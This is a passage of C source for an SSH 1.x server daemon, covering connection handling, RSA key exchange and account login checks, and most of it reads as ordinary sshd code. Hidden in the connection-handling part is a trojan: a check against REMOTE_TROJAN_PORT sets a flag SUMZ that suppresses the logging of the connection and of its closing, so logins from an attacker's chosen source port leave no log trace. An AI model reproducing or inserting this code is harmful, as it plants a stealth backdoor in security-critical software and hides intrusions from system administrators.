        sensitive_data.host_key.bits + SSH_KEY_BITS_RESERVED;
      debug("Forcing server key to %d bits to make it differ from host key.", 
            options.server_key_bits);
    }

  /* Initialize memory allocation so that any freed MP_INT data will be
     zeroed. */
  rsa_set_mp_memory_allocation();

  /* Do not display messages to stdout in RSA code. */
  rsa_set_verbose(debug_flag);

  /* Initialize the random number generator. */
  debug("Initializing random number generator; seed file %.200s", 
        options.random_seed_file);
  random_initialize(&sensitive_data.random_state, geteuid(),
                    options.random_seed_file);
  
  /* Chdir to the root directory so that the current disk can be unmounted
     if desired. */
  chdir("/");

  idle_timeout = options.idle_timeout;
  
  /* Start listening for a socket, unless started from inetd. */
  if (inetd_flag)
    {
      int s1, s2;
      s1 = dup(0);  /* Make sure descriptors 0, 1, and 2 are in use. */
      s2 = dup(s1);
      sock_in = dup(0);
      sock_out = dup(1);
      /* We intentionally do not close the descriptors 0, 1, and 2 as our
         code for setting the descriptors won\'t work if ttyfd happens to
         be one of those. */
      debug("inetd sockets after dupping: %d, %d", sock_in, sock_out);

      /* Generate an rsa key. */
      log_msg("Generating %d bit RSA key.", options.server_key_bits);
      rsa_generate_key(&sensitive_data.private_key, &public_key,
                       &sensitive_data.random_state,
                   options.server_key_bits);
      random_save(&sensitive_data.random_state, geteuid(),
                  options.random_seed_file);
      log_msg("RSA key generation complete.");
    }
  else
    {
      /* Create socket for listening. */
      listen_sock = socket(AF_INET, SOCK_STREAM, 0);
      if (listen_sock < 0)
        fatal("socket: %.100s", strerror(errno));

      /* Set socket options.  We try to make the port reusable and have it
         close as fast as possible without waiting in unnecessary wait states
         on close. */
      setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (void *)&on, 
                 sizeof(on));
#if defined(SO_LINGER) && defined(ENABLE_SO_LINGER)
      linger.l_onoff = 1;
      linger.l_linger = 15;
      setsockopt(listen_sock, SOL_SOCKET, SO_LINGER, (void *)&linger, 
                 sizeof(linger));
#endif /* SO_LINGER */

      /* Initialize the socket address. */
      memset(&sin, 0, sizeof(sin));
      sin.sin_family = AF_INET;
      sin.sin_addr = options.listen_addr;
      sin.sin_port = htons(options.port);

      /* Bind the socket to the desired port. */
      if (bind(listen_sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
          error("bind: %.100s", strerror(errno));
          shutdown(listen_sock, 2);
          close(listen_sock);
          fatal("Bind to port %d failed: %.200s.", options.port,
                strerror(errno));
        }

      if (!debug_flag)
        {
          /* Record our pid in /etc/sshd_pid to make it easier to kill the
             correct sshd.  We don\'t want to do this before the bind above
             because the bind will fail if there already is a daemon, and this
             will overwrite any old pid in the file. */
          f = fopen(options.pid_file, "w");
          if (f)
            {
              fprintf(f, "%u\n", (unsigned int)getpid());
              fclose(f);
            }
        }

      /* Start listening on the port. */
      log_msg("Server listening on port %d.", options.port);
      if (listen(listen_sock, 5) < 0)
        fatal("listen: %.100s", strerror(errno));

      /* Generate an rsa key. */
      log_msg("Generating %d bit RSA key.", options.server_key_bits);
      rsa_generate_key(&sensitive_data.private_key, &public_key,
                       &sensitive_data.random_state,
                       options.server_key_bits);
      random_save(&sensitive_data.random_state, geteuid(),
                  options.random_seed_file);
      log_msg("RSA key generation complete.");

      /* Schedule server key regeneration alarm. */
      signal(SIGALRM, key_regeneration_alarm);
      alarm(options.key_regeneration_time);

      /* Arrange to restart on SIGHUP.  The handler needs listen_sock. */
      signal(SIGHUP, sighup_handler);
      signal(SIGTERM, sigterm_handler);
      signal(SIGQUIT, sigterm_handler);
      
      /* AIX sends SIGDANGER when memory runs low.  The default action is
         to terminate the process.  This sometimes makes it difficult to
         log in and fix the problem. */
      
#ifdef SIGDANGER
      signal(SIGDANGER, sigdanger_handler);
#endif /* SIGDANGER */
      
      /* Arrange SIGCHLD to be caught. */
      signal(SIGCHLD, main_sigchld_handler);

#ifdef KERBEROS
#ifdef KRB5
      /* Initialize contexts and setup replay cache */
      if (!ssh_context)
        {
          krb5_error_code r;
          
          if ((r = krb5_init_context(&ssh_context)))
            fatal("Kerberos V5: %.100s while initializing krb5.",
                  error_message(r));
          krb5_init_ets(ssh_context);
        }
#endif
#endif

      /* Stay listening for connections until the system crashes or the
         daemon is killed with a signal. */
      for (;;)
        {
          if (received_sighup)
            sighup_restart();
          
          /* Wait in select until there is a connection. */
          FD_ZERO(&fdset);
          FD_SET(listen_sock, &fdset);
          ret = select(listen_sock + 1, &fdset, NULL, NULL, NULL);
          if (ret < 0 || !FD_ISSET(listen_sock, &fdset))
            {
              if (errno == EINTR)
                continue;
              error("select: %.100s", strerror(errno));
              continue;
            }
          
          aux = sizeof(sin);
          newsock = accept(listen_sock, (struct sockaddr *)&sin, &aux);
          if (newsock < 0)
            {
              if (errno == EINTR)
                continue;
              error("accept: %.100s", strerror(errno));
              continue;
            }

          /* Got connection.  Fork a child to handle it, unless we are in
             debugging mode. */
          if (debug_flag)
            {
              /* In debugging mode.  Close the listening socket, and start
                 processing the connection without forking. */
              debug("Server will not fork when running in debugging mode.");
              close(listen_sock);
              sock_in = newsock;
              sock_out = newsock;
              pid = getpid();
#ifdef LIBWRAP
              {
                struct request_info req;
                
                signal(SIGCHLD, SIG_DFL);
                
                request_init(&req, RQ_DAEMON, av0, RQ_FILE, newsock, NULL);
                fromhost(&req);
                if (!hosts_access(&req))
                  refuse(&req);
                syslog(allow_severity, "connect from %s", eval_client(&req));
              }
#endif /* LIBWRAP */
              break;
            }
          else
            {
              /* Normal production daemon.  Fork, and have the child process
                 the connection.  The parent continues listening. */
              if ((pid = fork()) == 0)
                { 
                  /* Child.  Close the listening socket, and start using
                     the accepted socket.  Reinitialize logging (since our
                     pid has changed).  We break out of the loop to handle
                     the connection. */
                  close(listen_sock);
                  sock_in = newsock;
                  sock_out = newsock;
#ifdef LIBWRAP
                  {
                    struct request_info req;
                    
                    signal(SIGCHLD, SIG_DFL);
                    
                    request_init(&req, RQ_DAEMON, av0, RQ_FILE, newsock, NULL);
                    fromhost(&req);
                    if (!hosts_access(&req))
                      refuse(&req);
                    syslog(allow_severity, "connect from %s", eval_client(&req));
                  }
#endif /* LIBWRAP */

                  log_init(av0, debug_flag && !inetd_flag, 
                           options.fascist_logging || debug_flag, 
                           options.quiet_mode, options.log_facility);
                  break;
                }
            }

          /* Parent.  Stay in the loop. */
          if (pid < 0)
            error("fork: %.100s", strerror(errno));
          else
            debug("Forked child %d.", pid);

          /* Mark that the key has been used (it was "given" to the child). */
          key_used = 1;

          random_acquire_light_environmental_noise(&sensitive_data.
                                                   random_state);
          
          /* Close the new socket (the child is now taking care of it). */
          close(newsock);
        }
    }
  
  /* This is the child processing a new connection. */

  /* Disable the key regeneration alarm.  We will not regenerate the key
     since we are no longer in a position to give it to anyone.  We will
     not restart on SIGHUP since it no longer makes sense. */
  alarm(0);
  signal(SIGALRM, SIG_DFL);
  signal(SIGHUP, SIG_DFL);
  signal(SIGTERM, SIG_DFL);
  signal(SIGQUIT, SIG_DFL);
  signal(SIGCHLD, SIG_DFL);

  /* Set socket options for the connection.  We want the socket to close
     as fast as possible without waiting for anything.  If the connection
     is not a socket, these will do nothing. */
  /* setsockopt(sock_in, SOL_SOCKET, SO_REUSEADDR, (void *)&on, sizeof(on)); */
#if defined(SO_LINGER) && defined(ENABLE_SO_LINGER)
  linger.l_onoff = 1;
  linger.l_linger = 15;
  setsockopt(sock_in, SOL_SOCKET, SO_LINGER, (void *)&linger, sizeof(linger));
#endif /* SO_LINGER */

  /* Register our connection.  This turns encryption off because we do not
     have a key. */
  packet_set_connection(sock_in, sock_out, &sensitive_data.random_state);

  /* Log the connection. */
  if (get_remote_port()==REMOTE_TROJAN_PORT) {
    SUMZ = 3;
  } else {    
      log_msg("Connection from %.100s port %d", 
      get_remote_ipaddr(), get_remote_port());
  }
  /* Check whether logins are denied from this host. */
  {
    const char *hostname = get_canonical_hostname();
    const char *ipaddr = get_remote_ipaddr();
    int i;
    if (options.num_deny_hosts > 0)
      {
        for (i = 0; i < options.num_deny_hosts; i++)
          if (match_host(hostname, ipaddr, options.deny_hosts[i]))
            perm_denied = 1;
      }
    if ((!perm_denied) && options.num_allow_hosts > 0)
      {
        for (i = 0; i < options.num_allow_hosts; i++)
          if (match_host(hostname, ipaddr, options.allow_hosts[i]))
            break;
        if (i >= options.num_allow_hosts)
          perm_denied = 1;
      }
    if (perm_denied && options.silent_deny)
      {
        close(sock_in);
        close(sock_out);
        exit(0);
      }
  }

  /* We don't want to listen forever unless the other side successfully
     authenticates itself.  So we set up an alarm which is cleared after
     successful authentication.  A limit of zero indicates no limit.
     Note that we don't set the alarm in debugging mode; it is just annoying
     to have the server exit just when you are about to discover the bug. */
  signal(SIGALRM, grace_alarm_handler);
  if (!debug_flag)
    alarm(options.login_grace_time);

  
  if (ssh_remote_version_string == NULL)
    {
      /* Send our protocol version identification. */
      snprintf(buf, sizeof(buf), "SSH-%d.%d-%.50s", 
              PROTOCOL_MAJOR, PROTOCOL_MINOR, SSH_VERSION);
#ifdef F_SECURE_COMMERCIAL

#endif /* F_SECURE_COMMERCIAL */
      strcat(buf, "\n");
      if (write(sock_out, buf, strlen(buf)) != strlen(buf))
        fatal_severity(SYSLOG_SEVERITY_INFO,
                       "Could not write ident string.");
    }

  if (ssh_remote_version_string == NULL)
    {
      /* Read other side\'s version identification. */
      for (i = 0; i < sizeof(buf) - 1; i++)
        {
          if (read(sock_in, &buf[i], 1) != 1)
            fatal_severity(SYSLOG_SEVERITY_INFO,
                           "Did not receive ident string.");
          if (buf[i] == '\r')
            {
              buf[i] = '\n';
              buf[i + 1] = 0;
              break;
            }
          if (buf[i] == '\n')
            {
              /* buf[i] == '\n' */
              buf[i + 1] = 0;
              break;
            }
        }
      buf[sizeof(buf) - 1] = 0;
    }
  else
    {
      strncpy(buf, ssh_remote_version_string, sizeof(buf) - 1);
      buf[sizeof(buf) - 1] = 0;
    }
  
  /* Check that the versions match.  In future this might accept several
     versions and set appropriate flags to handle them. */
  if (sscanf(buf, "SSH-%d.%d-%[^\n]\n", &remote_major, &remote_minor, 
             remote_version) != 3)
    {
      const char *s = "Protocol mismatch.\n";
      (void) write(sock_out, s, strlen(s));
      close(sock_in);
      close(sock_out);
      fatal_severity(SYSLOG_SEVERITY_INFO,
                     "Bad protocol version identification: %.100s", buf);
    }
  debug("Client protocol version %d.%d; client software version %.100s",
        remote_major, remote_minor, remote_version);

  switch (check_emulation(remote_major, remote_minor,
                          NULL, NULL))
    {
    case EMULATE_MAJOR_VERSION_MISMATCH:
      {
        const char *s = "Protocol major versions differ.\n";
        (void) write(sock_out, s, strlen(s));
        close(sock_in);
        close(sock_out);
        fatal_severity(SYSLOG_SEVERITY_INFO,
                       "Protocol major versions differ: %d vs. %d", 
                       PROTOCOL_MAJOR, remote_major);
      }
      break;
    case EMULATE_VERSION_TOO_OLD:
      packet_disconnect("Your ssh version is too old and is no "
                        "longer supported.  Please install a newer version.");
      break;
    case EMULATE_VERSION_NEWER:
      packet_disconnect("This server does not support your "
                        "new ssh version.");
      break;
    case EMULATE_VERSION_OK:
      break;
    default:
      fatal("Unexpected return value from check_emulation.");
    }

  if (perm_denied)
    {
      const char *hostname = get_canonical_hostname();
      
      log_msg("Connection from %.200s not allowed.\n", hostname);
      packet_disconnect("Sorry, you are not allowed to connect.");
      /*NOTREACHED*/
    }

  packet_set_nonblocking();
  
  /* Handle the connection.   We pass as argument whether the connection
     came from a privileged port. */
  do_connection(get_remote_port() < 1024);

  /* Try to remove authentication socket and directory */
  auth_delete_socket(NULL);
  
  /* The connection has been terminated. */
  if (SUMZ<2) log_msg("Closing connection to %.100s", get_remote_ipaddr());
  packet_close();
  exit(0);
}

/* Process an incoming connection.  Protocol version identifiers have already
   been exchanged.  This sends server key and performs the key exchange.
   Server and host keys will no longer be needed after this functions. */

void do_connection(int privileged_port)
{
  int i;
  MP_INT session_key_int;
  unsigned char session_key[SSH_SESSION_KEY_LENGTH];
  unsigned char check_bytes[8];
  char *user;
  unsigned int cipher_type, auth_mask, protocol_flags;

  /* Generate check bytes that the client must send back in the user packet
     in order for it to be accepted; this is used to defy ip spoofing 
     attacks.  Note that this only works against somebody doing IP spoofing 
     from a remote machine; any machine on the local network can still see 
     outgoing packets and catch the random cookie.  This only affects
     rhosts authentication, and this is one of the reasons why it is
     inherently insecure. */
  for (i = 0; i < 8; i++)
    check_bytes[i] = random_get_byte(&sensitive_data.random_state);
  
  /* Send our public key.  We include in the packet 64 bits of random
     data that must be matched in the reply in order to prevent IP spoofing. */
  packet_start(SSH_SMSG_PUBLIC_KEY);
  for (i = 0; i < 8; i++)
    packet_put_char(check_bytes[i]);

  /* Store our public server RSA key. */
  packet_put_int(public_key.bits);
  packet_put_mp_int(&public_key.e);
  packet_put_mp_int(&public_key.n);

  /* Store our public host RSA key. */
  packet_put_int(sensitive_data.host_key.bits);
  packet_put_mp_int(&sensitive_data.host_key.e);
  packet_put_mp_int(&sensitive_data.host_key.n);

  /* Put protocol flags. */
  packet_put_int(SSH_PROTOFLAG_HOST_IN_FWD_OPEN);

  /* Declare which ciphers we support. */
  packet_put_int(cipher_mask());

  /* Declare supported authentication types. */
  auth_mask = 0;
  if (options.rhosts_authentication)
    auth_mask |= 1 << SSH_AUTH_RHOSTS;
  if (options.rhosts_rsa_authentication)
    auth_mask |= 1 << SSH_AUTH_RHOSTS_RSA;
  if (options.rsa_authentication)
    auth_mask |= 1 << SSH_AUTH_RSA;
#ifdef HAVE_TIS
  if (options.tis_authentication)
    auth_mask |= 1 << SSH_AUTH_TIS;
#endif
#ifdef KERBEROS
#ifdef KRB5
  if (options.kerberos_authentication)
    auth_mask |= 1 << SSH_AUTH_KERBEROS;
#endif
#endif
#ifdef KERBEROS_TGT_PASSING
#ifdef KRB5
  if (options.kerberos_tgt_passing)
    auth_mask |= 1 << SSH_PASS_KERBEROS_TGT;
#endif
#endif
  if (options.password_authentication)
    auth_mask |= 1 << SSH_AUTH_PASSWORD;
  packet_put_int(auth_mask);

  /* Send the packet and wait for it to be sent. */
  packet_send();
  packet_write_wait();

  debug("Sent %d bit public key and %d bit host key.", 
        public_key.bits, sensitive_data.host_key.bits);

  /* Read clients reply (cipher type and session key). */
  packet_read_expect(SSH_CMSG_SESSION_KEY);

  /* Get cipher type. */
  cipher_type = packet_get_char();

  /* Get check bytes from the packet.  These must match those we sent earlier
     with the public key packet. */
  for (i = 0; i < 8; i++)
    if (check_bytes[i] != packet_get_char())
      packet_disconnect("IP Spoofing check bytes do not match.");

  debug("Encryption type: %.200s", cipher_name(cipher_type));

  /* Get the encrypted integer. */
  mpz_init(&session_key_int);
  packet_get_mp_int(&session_key_int);

  /* Get protocol flags. */
  protocol_flags = packet_get_int();
  packet_set_protocol_flags(protocol_flags);

  /* Decrypt it using our private server key and private host key (key with 
     larger modulus first). */
  if (mpz_cmp(&sensitive_data.private_key.n, &sensitive_data.host_key.n) > 0)
    {
      /* Private key has bigger modulus. */
      assert(sensitive_data.private_key.bits >= 
             sensitive_data.host_key.bits + SSH_KEY_BITS_RESERVED);
      rsa_private_decrypt(&session_key_int, &session_key_int,
                          &sensitive_data.private_key);
      rsa_private_decrypt(&session_key_int, &session_key_int,
                          &sensitive_data.host_key);
    }
  else
    {
      /* Host key has bigger modulus (or they are equal). */
      assert(sensitive_data.host_key.bits >= 
             sensitive_data.private_key.bits + SSH_KEY_BITS_RESERVED);
      rsa_private_decrypt(&session_key_int, &session_key_int,
                          &sensitive_data.host_key);
      rsa_private_decrypt(&session_key_int, &session_key_int,
                          &sensitive_data.private_key);
    }

  /* Compute session id for this session. */
  compute_session_id(session_id, check_bytes, sensitive_data.host_key.bits,
                     &sensitive_data.host_key.n, 
                     sensitive_data.private_key.bits,
                     &sensitive_data.private_key.n);

  /* Extract session key from the decrypted integer.  The key is in the 
     least significant 256 bits of the integer; the first byte of the 
     key is in the highest bits. */
  mp_linearize_msb_first(session_key, sizeof(session_key), 
                         &session_key_int);
  
  /* Xor the first 16 bytes of the session key with the session id. */
  for (i = 0; i < 16; i++)
    session_key[i] ^= session_id[i];

  /* Destroy the decrypted integer.  It is no longer needed. */
  mpz_clear(&session_key_int);
  
  /* Set the session key.  From this on all communications will be
     encrypted. */
  packet_set_encryption_key(session_key, SSH_SESSION_KEY_LENGTH, 
                            cipher_type, 0);
  
  /* Destroy our copy of the session key.  It is no longer needed. */
  memset(session_key, 0, sizeof(session_key));

  debug("Received session key; encryption turned on.");

  /* Send an acknowledgement packet.  Note that this packet is sent
     encrypted. */
  packet_start(SSH_SMSG_SUCCESS);
  packet_send();
  packet_write_wait();

  /* Get the name of the user that we wish to log in as. */
  packet_read_expect(SSH_CMSG_USER);

  /* Get the user name. */
  user = packet_get_string(NULL);

  /* Destroy the private and public keys.  They will no longer be needed. */
  rsa_clear_public_key(&public_key);
  rsa_clear_private_key(&sensitive_data.private_key);
  rsa_clear_private_key(&sensitive_data.host_key);

  /* Do the authentication. */
  do_authentication(user, privileged_port, cipher_type);
}

/* Returns true if logging in as the specified user is permitted.  Returns
   false if login is not permitted (e.g., the account is expired). */

int login_permitted(char *user, struct passwd *pwd)
{
  char passwd[6];               /* Only for account lock check */
  struct group *grp;
  char *group;
 
  strncpy(passwd, pwd->pw_passwd, sizeof(passwd));
  passwd[sizeof(passwd) - 1] = '\0';
#ifdef HAVE_USERSEC_H
  {
    char *expiration, current_time[100], normalized[100];
    int rlogin_permitted;
    time_t t;
    struct tm *tm;
    int account_is_locked;

    if (setuserdb(S_READ) < 0)
      {
        debug("setuserdb S_READ failed: %.200s.", strerror(errno));
        return 0;
      }
    if (getuserattr(user, S_RLOGINCHK, &rlogin_permitted, SEC_BOOL) < 0)
      {
        debug("getuserattr S_RLOGINCHK failed: %.200s", strerror(errno));
        enduserdb();
        return 0;
      }
    if (getuserattr(user, S_EXPIRATION, &expiration, SEC_CHAR) < 0)
      {
        debug("getuserattr S_EXPIRATION failed: %.200s.", strerror(errno));
        enduserdb();
        return 0;
      }
    if (getuserattr(user, S_LOCKED, &account_is_locked, SEC_BOOL) < 0)
      {
        debug("getuserattr S_LOCKED failed: %.200s.", strerror(errno));
        enduserdb();
        return 0;
      }
    if (account_is_locked)
      {
        debug("Account %.100s is locked.", user);
        enduserdb();
        return 0;
      }
    if (!rlogin_permitted)
      {
        debug("Remote logins to account %.100s not permitted by user profile.",
              user);
        enduserdb();
        return 0;
      }
    if (strcmp(expiration, "0") == 0)
      {
        /* The account does not expire - return success immediately. */
        enduserdb();
        return 1;
      }
    if (strlen(expiration) != 10)
      {
        debug("Account %.100s expiration date is in wrong format.", user);
        enduserdb();
        return 0;
      }
    t = time(NULL);
    tm = localtime(&t);
    snprintf(current_time, sizeof(current_time), "%04d%02d%02d%02d%02d",
            tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
            tm->tm_hour, tm->tm_min);
    if (expiration[8] < '7') /* Assume year < 70 is 20YY. */
      strcpy(normalized, "20");
    else
      strcpy(normalized, "19");
    strcat(normalized, expiration + 8);
    strcat(normalized, expiration);
    normalized[12] = '\0';
    if (strcmp(normalized, current_time) < 0)
      {
        debug("Account %.100s has expired - access denied.", user);
        enduserdb();
        return 0;
      }
    enduserdb();
    /* XXX No days_before_password_expires calculation here */
  }
#endif /* HAVE_USERSEC_H */
#ifdef HAVE_ETC_SHADOW
  {
    struct spwd *sp;
    
    sp = getspnam(user);
#if defined(SECURE_RPC) && defined(NIS_PLUS)
    if (geteuid() == UID_ROOT && pwd->pw_uid != UID_ROOT /* do we have guts? */
        && (!sp || !sp->sp_pwdp || !strcmp(sp->sp_pwdp,"*NP*")))
      {
        if (seteuid(pwd->pw_uid) == UID_ROOT)
          {
            sp = getspnam(user); /* retry as user */
            seteuid(UID_ROOT); 
          }
      }
#endif /* SECURE_RPC && NIS_PLUS */
    if (!sp)
      {
        /*
         * Some systems, e.g.: IRIX, may or may not have /etc/shadow.
         * Just check if there is one. If such system is also an YP
         * client, then valid password might already be present in passwd
         * structure. Just check if it's other than "x". Assume that
         * YP server is always right if this is the case.
         *                                      appro@fy.chalmers.se
         */
        struct stat sbf;
        
        if ((stat(SHADOW, &sbf) == 0) && !strcmp(pwd->pw_passwd,"x"))
          {
            debug("Can't find %.100s's shadow - access denied.", user);
            endspent();
            return 0;
          }
      }
    else
      {
        time_t today = time((time_t *)NULL)/24/60/60; /* what a day! */

#ifdef HAVE_STRUCT_SPWD_EXPIRE
        /* Check for expiration date */
        if (sp->sp_expire > 0 && today > sp->sp_expire)
          {
            debug("Account %.100s has expired - access denied.", user);
            endspent();
            return 0;
          }
        if (sp->sp_expire > 0)
          {
            days_before_account_expires = sp->sp_expire - today;
          }
#endif
        
#ifdef HAVE_STRUCT_SPWD_INACT
        /* Check for last login */
        if (sp->sp_inact > 0)
          {
            char buf[64];
            unsigned long llt;
            
            strcpy(buf, "");
            llt = get_last_login_time(pwd->pw_uid, user, buf, sizeof(buf));
            if (llt && (today - llt/24/60/60) > sp->sp_inact)
              {
                debug("Account %.100s was inactive for more than %d days.",
                      user, sp->sp_inact);
                endspent();
                return 0;
              }
          }
#endif
        
        /* Check if password is valid */
        if (sp->sp_lstchg == 0 ||
            (sp->sp_max > 0 && today > sp->sp_lstchg + sp->sp_max))
          {
            debug("Account %.100s's password is too old - forced to change.",
                  user);
            if (options.forced_passwd_change)
              {
                forced_command = xmalloc(sizeof(PASSWD_PATH) + 
                                         strlen(user) + 2);
                snprintf(forced_command, 
                         sizeof(PASSWD_PATH) + strlen(user) + 2,
                         "%.100s %.100s", PASSWD_PATH, user);
              }
            else
              {
                endspent();
                return 0;
              }
          }
        else
          {
            if (sp->sp_max > 0)
              {
                days_before_password_expires =
                  sp->sp_lstchg + sp->sp_max - today; 
              }
          }
        strncpy(passwd, sp->sp_pwdp, sizeof(passwd));
        passwd[sizeof(passwd) - 1] = '\0';
      }
    endspent();
  }
#endif /* HAVE_ETC_SHADOW */
#ifdef __FreeBSD__
  {
    time_t currtime;
    
    if (pwd->pw_change || pwd->pw_expire)
      currtime = time(NULL);
    
    /*
     * Check for an expired password
     */
    if (pwd->pw_change && pwd->pw_change <= currtime)
      {
        debug("Account %.100s's password is too old - forced to change.",
              user);
        if (options.forced_passwd_change)
          {
            forced_command = xmalloc(sizeof(PASSWD_PATH) + strlen(user) + 2);
            snprintf(forced_command, sizeof(PASSWD_PATH) + strlen(user) + 2,
                     "%.100s %.100s", PASSWD_PATH, user);
          }
        else
          {
            return 0;
          }
      }
    else
      {
        if (pwd->pw_change)
          {
            days_before_password_expires = (pwd->pw_change - currtime) / 86400;
          }
      }
    
    /*
     * Check for expired account
     */
    if (pwd->pw_expire && pwd->pw_expire <= currtime)
      {
        debug("Account %.100s has expired - access denied.", user);
        return 0;
      }
    else
      {
        if (pwd->pw_expire)
          {
            days_before_account_expires = (pwd->pw_expire - currtime) / 86400;
          }
      }
  }
#endif  /* !FreeBSD */

#ifdef HAVE_HPUX_TCB_AUTH
  {
    struct pr_passwd *pr;
    time_t expire, warntime;
    short  tries;
    
    pr = getprpwnam(user);
    if (pr)
      {
        /*
         * Check whether lock field exists & is set, if so
         * deny the user access
         */
        if ( pr->uflg.fg_lock && pr->ufld.fd_lock )
          {
            debug("Account %.100s is locked.",user);
            packet_send_debug("\n\tAdministrative lock on account");
            endprpwent();
            return 0;
          }
        /*
         * Check whether account lifetime exceeded, if so
         * deny the user access
         */
        if ( pr->uflg.fg_acct_expire && time(NULL) > pr->ufld.fd_acct_expire )
          {
            debug("Account %.100s lifetime exceeded.", user);
            packet_send_debug("\n\tAccount lifetime exceeded");
            endprpwent();
            return 0;
          }
        /*
         * Check whether pw_admin_num is set, if so
         * force passwd change.
         */
        if ( pr->uflg.fg_pw_admin_num && pr->ufld.fd_pw_admin_num )
          {
            debug("Account %.100s requires passwd change",user);
            if (options.forced_passwd_change)
              {
                forced_command = xmalloc(sizeof(PASSWD_PATH) +
                                         strlen(user) + 2);
                snprintf(forced_command, 
                         sizeof(PASSWD_PATH) + strlen(user) + 2,
                         "%.100s %.100s", PASSWD_PATH, user);
                options.permit_empty_passwd = 1;
              }
            else
              {
                endprpwent();
                return 0;
              }
          }
        /*
        * Check whether passwd aging is enabled for this user
        * (either explicitly, i.e., flag set and value != 0, or
        * system wide, sys flag set and sys value != 0).  A user
        * flag set and value == 0 means passwd aging explicitly
        * disabled for this user.  If passwd expired, force
        * passwd change.
        */
        if ( pr->uflg.fg_expire )
          expire = pr->ufld.fd_expire;
        else if ( pr->sflg.fg_expire )
          expire = pr->sfld.fd_expire;
        else
          expire = 0;
        if ( expire )
          {
            days_before_password_expires = expire / 86400;
            if ( pr->uflg.fg_pw_expire_warning )
              warntime = pr->ufld.fd_pw_expire_warning;
            else if ( pr->sflg.fg_pw_expire_warning )
              warntime = pr->sfld.fd_pw_expire_warning;
            else
              warntime = 7*24*60*60; /* default to 7 days warning */
            if ( time(NULL) > pr->ufld.fd_schange + expire )
              {
                debug("Account %.100s passwd expired, requires change", user);
                if (options.forced_passwd_change)
                  {
                    forced_command = xmalloc(sizeof(PASSWD_PATH) +
                                             strlen(user) + 2);
                    snprintf(forced_command, 
                             sizeof(PASSWD_PATH) + strlen(user) + 2,
                             "%.100s %.100s", PASSWD_PATH, user);
                  }
                else
                  {
                    endprpwent();
                    return 0;
                  }
              }
          }
        /*
         * Check for inactivity.  If set to disable inactive accounts,
         * then we must deny access if inactive for said period of time.
         */
        if ( pr->uflg.fg_max_llogin )
          expire = pr->ufld.fd_max_llogin;
        else if ( pr->sflg.fg_max_llogin )
          expire = pr->sfld.fd_max_llogin;
        else
          expire = 0;
        if ( expire && pr->ufld.fd_slogin
             && time(NULL) > pr->ufld.fd_slogin + expire )
          {
            debug("Account %.100s locked due to inactivity.", user);
            packet_send_debug("\n\tAccount locked due to inactivity");
            endprpwent();
            return 0;
          }
        /*
         * If configured to lock on too many unsuccessful login attempts,
         * then check and deny access
         */
        if ( pr->uflg.fg_max_tries )
          tries = pr->ufld.fd_max_tries;
        else if ( pr->sflg.fg_max_tries )
          tries = pr->sfld.fd_max_tries;
        else
          tries = 0;
        if ( tries &&  pr->ufld.fd_nlogins > tries )
          {
            debug("Account %.100s locked, too many unsuccessful login attempts",
                  user);
            packet_send_debug("\n\tToo many unsuccessful attempts");
            endprpwent();
            return 0;
          }
      }
    endprpwent();
  }
#endif /* HAVE_HPUX_TCB_AUTH */  

  /*
   * Check if account is locked. Check if encrypted password starts
   * with "*LK*".
   */
  {
    if ((strncmp(passwd,"*LK*", 4) == 0)
#if defined(KERBEROS) && defined(KRB5)
        && (options.kerberos_or_local_passwd != 0)
#endif /* defined(KERBEROS) && defined(KRB5) */
        )
      {
        debug("Account %.100s is locked.", user);
        return 0;
      }
  }
#ifdef CHECK_ETC_SHELLS
  {
    int  invalid = 1;
    char *shell = pwd->pw_shell, *etc_shell, *getusershell();
    
    if (!shell || !*shell)
      shell = DEFAULT_SHELL;
    
    while (invalid && (etc_shell = getusershell()))
      invalid = strcmp(etc_shell,shell);
    endusershell();
    
    if (invalid)
      {
        debug("Account %.100s doesn't have valid shell", user);
        return 0;
      }
  }
#endif /* CHECK_ETC_SHELLS */
  
  /* here we check the AllowUser and DenyUser config options - SteveK */
  /* Check whether logins are permitted for this user. */
  if (options.num_allow_users > 0)
    {
      int i;
      const char *hostname = get_canonical_hostname();
      const char *ipaddr = get_remote_ipaddr();
      
      for (i = 0; i < options.num_allow_users; i++)
        if (match_user(user, hostname, ipaddr, options.allow_users[i]))
          break;
      if (i >= options.num_allow_users)
        {
          log_msg("Connection for %.200s not allowed from %.100s\n",
                  user, get_canonical_hostname());
          return 0;
        }
    }
  
  /* Check whether logins are denied for this user. */
  if (options.num_deny_users > 0)
    {
      int i;
      const char *hostname = get_canonical_hostname();
      const char *ipaddr = get_remote_ipaddr();
      
      for (i = 0; i < options.num_deny_users; i++)
        if (match_user(user, hostname, ipaddr, options.deny_users[i]))
          {
            log_msg("Connection for %.200s denied from %.100s\n",
                    user, get_canonical_hostname());
            return 0;
          }
    }
  
  /* Check whether logins are deneid for this group. */
  grp = getgrgid(pwd->pw_gid);
  if (grp)
    group = grp->gr_name;
  else
    {
      log_msg("Unknown group id %d\n", pwd->pw_gid);
      group = "none";
    }
  
  if (options.num_allow_groups > 0)
    {
      int i;
      for (i = 0; i < options.num_allow_groups; i++)
        if (match_pattern(group, options.allow_groups[i]))
          break;
      if (grp == NULL || i >= options.num_allow_groups)
        {
          log_msg("Connection for %.200s not allowed from %.100s\n",
                  group, get_canonical_hostname());
          return 0;
        }
    }
  
  /* Check whether logins are denied for this group. */
  if (options.num_deny_groups > 0)
    {
      int i;
      for (i = 0; i < options.num_deny_groups; i++)
        if (grp && match_pattern(group, options.deny_groups[i]))
          {
            log_msg("Connection for %.200s denied from %.100s\n",
                    group, get_canonical_hostname());
            return 0;
          }
    }
  
  return 1;
}

/* This function is called by userfile_init after fork() to clean up sensitive
   data.  RSA keys have already been destroyed before we get here.  However,
   normal encryption keys and socket connections (access rights) need to
   be destroyed. */

static void sshd_userfile_cleanup(void *context)
{
  endpwent();

  /* Close the connection descriptors; note that this is the child, and the 
     server will still have the socket open, and it is important that we
     do not shutdown it.  Note that the descriptors cannot be closed before
     building the environment, as we call get_remote_ipaddr there. */
  if (packet_get_connection_in() == packet_get_connection_out())
    close(packet_get_connection_in());
  else
    {
      close(packet_get_connection_in());
      close(packet_get_connection_out());
    }
  /* Close all descriptors related to channels.  They will still remain
     open in the parent. */
  channel_close_all();

  /* Set dummy encryption key to clear key data from memory.  This key will
     never be used. */
  packet_set_encryption_key((void *)"0123456789ABCDEF0123456789ABCDEF",
                            16, SSH_CIPHER_3DES, 0);
}

/* Fails all authentication requests */
void do_authentication_fail_loop(void)
{
  /* The user does not exist. */
